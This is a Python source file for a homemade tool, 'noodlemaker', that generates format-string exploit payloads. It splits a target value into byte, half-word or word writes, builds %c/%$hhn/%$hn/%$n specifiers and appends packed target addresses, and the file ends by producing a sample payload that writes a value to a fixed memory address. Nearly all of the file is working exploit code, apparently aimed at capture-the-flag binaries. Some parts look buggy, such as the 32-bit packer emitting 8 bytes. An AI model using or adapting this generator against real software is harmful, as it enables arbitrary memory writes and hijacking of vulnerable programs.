# NOODLEMAKER THE FORMAT STRING AUTOMATOR TOOL :D
# changing the data from numbers into bytes with dictionary indexes
def sautestuff(num : int):
    if(num>0xffffffffffffffff):
        return "Too much stuff in the plate : number too big"
    else:
        g = len(hex(num)[2::])//2 + len(hex(num)[2::])%2
        x = num.to_bytes(g, byteorder ="big")
        sauted = {}
        j=1
        for i in x:
            sauted[j] = i
            j+=1
        return sauted

# packing the elements into 4 2 or 1 byte sequences
def packstuff(sauted : dict,mode :int):
    sautedlist = [sauted[i] for i in sauted]
    # CASE 1 byte by byte packing
    if (mode == 1):
        readytomake = sauted
        sl = set(sautedlist)
        if (len(sl) < len(sautedlist) ):
            readytomake = packstuff(sauted,2)
            print("The bytes have been converted from mode 1 to 2 due to repeating sequences")
        else:
            for i in list(sauted):
                sauted[i-1] = sauted[i]
        return readytomake
    # CASE 12 '1 1 2' pattern  packing
    if (mode == 12):
        readytomake = sauted
        sl = set(sautedlist)
        if (len(sl) < len(sautedlist) ):
            readytomake = packstuff(sauted,2)
        else:
            for i in list(sauted):
                sauted[i-1] = sauted[i]
            i = len(sautedlist)
            sauted[i-2] = (int.from_bytes(int.to_bytes(sauted[i],1,byteorder= "big")+int.to_bytes(sauted[i-1],1,byteorder = "big"),byteorder = 'big'))
            del sauted[i-1]
        readytomake = sauted
        return readytomake
    # CASE 2 2 byte at a time packing
    elif (mode == 2):
        soap = {}
        if(len(sautedlist)%2==0):
            for i in range(1,len(sauted),2):
                    soap[i//2] = (int.from_bytes(int.to_bytes(sauted[i],1,byteorder= "big")+int.to_bytes(sauted[i+1],1,byteorder = "big"),byteorder = 'big'))
            return soap        
        if(len(sautedlist)%2!=0):
            x = sautedlist.pop(0)
            soap[0] = x
            for i in range(2,len(sauted),2):
                soap[i//2] = (int.from_bytes(int.to_bytes(sauted[i],1,byteorder= "big")+int.to_bytes(sauted[i+1],1,byteorder = "big"),byteorder = 'big'))
            return soap
    #case 3 four byte packing        
    elif (mode == 4):
        x = int.from_bytes(bytes(sautedlist), byteorder = "big")
        if (len(hex(x))<10):
            sautedlist  = [x]
            readytomake = { 0:x }
        else:
            sautedlist = [x]
            print(hex(x))
            j = hex(x)[2:-8:].ljust(1,"0")
            k = int(j,16)
            readytomake = {0:x,1:k}
        return readytomake
    
def garnisher(sauted,amt=0):
    emptylist = []
    for i in sauted:
        sauted[i] -= amt
    for i in sauted:
        if (sauted[i]<0):
            print("stuff aint gonna work")
            break
    if(i<0):
        return emptylist
    else:
        print(sauted)
        return sauted

# Takes in the bytesequences as argument and then converts it into dictionary sorted number chains
def servestuff(sauted):
    x= sauted
    count = 1
    order = []
    while(count < len(x)):
        min = 0xffffffffffffff
        slop = 0
        for i in sauted:
            if(sauted[i]< min and i not in order):
                min = sauted[i]
                slop = i
        order.append(slop)
        for i in sauted:
            if(i not in order):
                sauted[i] = sauted[i] - min
        count+=1 
    for i in sauted:
        if(i not in order):
            order.append(i)
    buffete = x
    return buffete, order


def saucecalc(num):
    num = num - num % 8 + 8  
    return num

def m64(num: int):
    stuff = (int.to_bytes(num,8, byteorder="little"))
    return stuff

def m32(num: int):
    stuff = (int.to_bytes(num,8, byteorder="little"))
    return stuff


def noodlemaker(tablenumber : int , recipe : dict ,    mode :str,   length: int  , arch : str, bitestaken=0):
    #            offset    { writeat : towrite }    mode= 1,12,2,4,8    1,2,4,8       32/64
    offset = tablenumber 
    recpy = [i for i in recipe]
    if (length):
        topple = 10000*"a"
        lop = [1,12,2,4,8,"Done"]
        i = 0
        while (len(topple) >= length):
            if (lop[i] == "Done"):
                return "cant optimise upto given length : I reccomend suffering / doing manually"
            topple = noodlemaker(offset,recipe,lop[i],None,arch)
            i+=1
        if (len(topple) <= length):
            return topple
    else:
        if (mode == 1):
            tab = recpy[0]
            ned = recipe[recpy[0]]
            x = (sautestuff(ned))
            y = packstuff(x,1)
            if (len(x)!= len(y)):
                mode = 2
            if(bitestaken):
                y = garnisher(y,amt=bitestaken)
            else:
                bitestaken = 0
                y = garnisher(y,amt=bitestaken)
            d,order = servestuff(y)
            dum = len(d)
            format = ""
            for i in order:
                format += f"%{d[i]}c%{offset+(dum-i)}$hhn"
            gum = len(format)
            format =""
            for i in order:
                format += f"%{d[i]}c%{offset+gum//8+(dum-i)}$hhn"
            gum = len(format)
            gum = saucecalc(gum)
            format = format.ljust(gum,"a")
            format = (format).encode()
            tomato = b""
            if(arch == "64" or arch == None):
                for i in order:
                    tomato += m64(tab+i)
            else:
                for i in order:
                    tomato += m32(tab+i)
            noodle = format + tomato
            return noodle
        if (mode == 12):
            tab = recpy[0]
            ned = recipe[recpy[0]]
            x = (sautestuff(ned))
            y = packstuff(x,12)
            if (len(x)!= len(y)):
                mode = 2
            if(bitestaken):
                y = garnisher(y,amt=bitestaken)
            else:
                bitestaken = 0
                y = garnisher(y,amt=bitestaken)
            d,order = servestuff(y)
            dum = len(d)
            format = ""
            for i in order:
                format += f"%{d[i]}c%{offset+(dum-i)}$hhn"
            gum = len(format)
            format =""
            for i in order:
                format += f"%{d[i]}c%{offset+gum//8+(dum-i)}$hhn"
            format = format[:-2:] + "n"
            gum = len(format)
            gum = saucecalc(gum)
            format = format.ljust(gum,"a")
            format = (format).encode()
            tomato = b""
            if(arch == "64" or arch == None):
                for i in order:
                    tomato += m64(tab+i)
                tomato = tomato[:-8:] + m64(tab+i+1)
            else:
                for i in order:
                    tomato += m32(tab+i)
                tomato = tomato[:-8:] + m32(tab+i+1)
            noodle = format + tomato
            return noodle
        if (mode == 2):
            tab = recpy[0]
            ned = recipe[recpy[0]]
            x = (sautestuff(ned))
            y = packstuff(x,2)
            if (len(x)!= len(y)):
                mode = 2
            if(bitestaken):
                y = garnisher(y,amt=bitestaken)
            else:
                bitestaken = 0
                y = garnisher(y,amt=bitestaken)
            d,order = servestuff(y)
            dum = len(d)
            format = ""
            for i in order:
                format += f"%{d[i]}c%{offset+(dum-i)}$hn"
            gum = len(format)
            format =""
            for i in order:
                format += f"%{d[i]}c%{offset+gum//8+(dum-i)}$hn"
            gum = len(format)
            gum = saucecalc(gum)
            format = format.ljust(gum,"a")
            format = (format).encode()
            tomato = b""
            if(arch == "64" or arch == None):
                for i in order:
                    tomato += m64(tab+2*i)
            else:
                for i in order:
                    tomato += m32(tab+2*i)
            noodle = format + tomato
            return noodle
        elif (mode == 4):
            tab = recpy[0]
            ned = recipe[recpy[0]]
            x = (sautestuff(ned))
            y = packstuff(x,4)
            if (len(x)!= len(y)):
                mode = 2
            if(bitestaken):
                y = garnisher(y,amt=bitestaken)
            else:
                bitestaken = 0
                y = garnisher(y,amt=bitestaken)
            d,order = servestuff(y)
            dum = len(d)
            format = ""
            for i in order:
                format += f"%{d[i]}c%{offset+(dum-i)}$n"
            gum = len(format)
            format =""
            for i in order:
                format += f"%{d[i]}c%{offset+gum//8+(dum-i)}$n"
            gum = len(format)
            gum = saucecalc(gum)
            format = format.ljust(gum,"a")
            format = (format).encode()
            tomato = b""
            if(arch == "64" or arch == None):
                for i in order:
                    tomato += m64(tab+2*i)
            else:
                for i in order:
                    tomato += m32(tab+2*i)
            noodle = format + tomato
            return noodle 
        elif(mode == 8):
            tab = recpy[0]
            ned = recipe[recpy[0]]
            x = (sautestuff(ned))
            y = packstuff(x,4)
            if (len(x)!= len(y)):
                mode = 2
            if(bitestaken):
                y = garnisher(y,amt=bitestaken)
            else:
                bitestaken = 0
                y = garnisher(y,amt=bitestaken)
            d,order = servestuff(y)
            dum = len(d)
            format = ""
            for i in order:
                format += f"%{d[i]}c%{offset+(dum-i)}$n"
            gum = len(format)
            format =""
            for i in order:
                format += f"%{d[i]}c%{offset+gum//8+(dum-i)}$n"
            gum = len(format)
            gum = saucecalc(gum)
            format = format.ljust(gum,"a")
            format = (format).encode()
            tomato = b""
            if(arch == "64" or arch == None):
                for i in order:
                    tomato += m64(tab+2*i)
            else:
                for i in order:
                    tomato += m32(tab+2*i)
            noodle = format + tomato
            return noodle
        else:
            return "Stuff not allowed bro the flip... only four modes 1, 2, 4, 8"
    noodle = recipe
    return noodle

print(noodlemaker(10,{0x601040 : 0xf02934},2,None,None,bitestaken = 40))